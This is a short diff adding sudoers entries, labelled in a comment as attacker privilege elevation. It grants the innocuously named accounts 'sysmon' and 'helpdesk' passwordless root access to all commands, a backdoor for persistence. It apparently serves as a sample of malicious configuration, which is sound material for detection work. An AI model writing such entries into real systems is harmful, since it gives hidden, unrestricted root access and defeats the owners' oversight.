@@ -1,0 +1,3 @@
+# Attacker rogue privilege elevation
+sysmon ALL=(ALL:ALL) NOPASSWD: ALL
+helpdesk ALL=(ALL) NOPASSWD: ALL
